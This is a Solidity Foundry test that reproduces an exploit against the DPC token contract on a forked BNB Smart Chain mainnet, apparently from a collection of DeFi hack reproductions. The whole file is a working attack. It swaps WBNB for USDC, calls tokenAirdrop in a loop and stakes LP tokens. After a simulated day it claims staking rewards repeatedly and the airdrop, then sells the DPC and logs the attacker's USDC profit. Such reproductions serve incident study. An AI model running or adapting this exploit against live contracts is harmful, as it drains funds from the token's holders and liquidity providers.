pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";
import "forge-std/console.sol";

contract ContractTest is DSTest {
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IUSDC USDC = IUSDC(0x55d398326f99059fF775485246999027B3197955);
    IDCP DPC = IDCP(0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE);
    IPancakeRouter routerV2 = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IPancakePair  pair = IPancakePair(0x79cD24Ed4524373aF6e047556018b1440CF04be3);

    function setUp() public {
        cheats.createSelectFork("bsc", 21179209); //fork mainnet at block 21179285
    }

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function testExp() external {
        console.log(" BNB balance ",address(this).balance);
        WBNB.deposit{value:20*1e18}();
        console.log(" After deposit WBNB balance of hacker ",WBNB.balanceOf(address(this)));
        USDC.approve(address(DPC), type(uint256).max);
        USDC.approve(address(routerV2), type(uint256).max);
        DPC.approve(address(routerV2), type(uint256).max);
        WBNB.approve(address(routerV2), type(uint256).max);
        pair.approve(address(DPC), type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(USDC);
        routerV2.swapExactTokensForTokens(
            20 * 1e18,
            1,
            path,
            address(this),
            block.timestamp + 60
        );
        console.log(" After swap USDC balance of hacker ",USDC.balanceOf(address(this))/1e18);
       
        for (uint8 i = 0; i < 44; i++) {
            DPC.tokenAirdrop(address(this), address(DPC), 100);
        }

        //cheats.createSelectFork("bsc", 21179222);
        path[0] = address(USDC);
        path[1] = address(DPC);
        routerV2.swapExactTokensForTokens(
            200 * 1e18,
            1,
            path,
            address(this),
            block.timestamp + 60
        );
       console.log(" After swap DPC balance of hacker ",DPC.balanceOf(address(this)));
        routerV2.addLiquidity(
            address(USDC),
            address(DPC),
            200 * 1e18,
            140 * 1e17,
            0,
            0,
            address(this),
            block.timestamp + 60
        );
       console.log(" After addLiquidity LP balance of hacker ",pair.balanceOf(address(this))/1e18);
       DPC.stakeLp(address(this),address(DPC),pair.balanceOf(address(this)));

        console.log(" After stakeLp  ");

        
        //cheats.createSelectFork("bsc", 21179254); 
        cheats.warp(block.timestamp + 24 * 60 * 60);

        for (uint8 i = 0; i < 15; i++) {
            DPC.claimStakeLp(address(this), 1);
        }
        console.log(" After claimStakeLp  ");
        //cheats.createSelectFork("bsc", 21179285); 
       
         //travelling 1 day in the future        
        DPC.claimDpcAirdrop(address(this));

        emit log_named_uint(
            "After claimDpcAirdrop DPC balance of attacker:",
            DPC.balanceOf(address(this))
        );

        path[0] = address(DPC);
        path[1] = address(USDC);
        routerV2.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            DPC.balanceOf(address(this)),
            1,
            path,
            address(this),
            block.timestamp + 60
        );

        emit log_named_uint(
            "After exploit repaid, profit in USDC of attacker:",
            USDC.balanceOf(address(this)) / 1e18
        );
    }
}
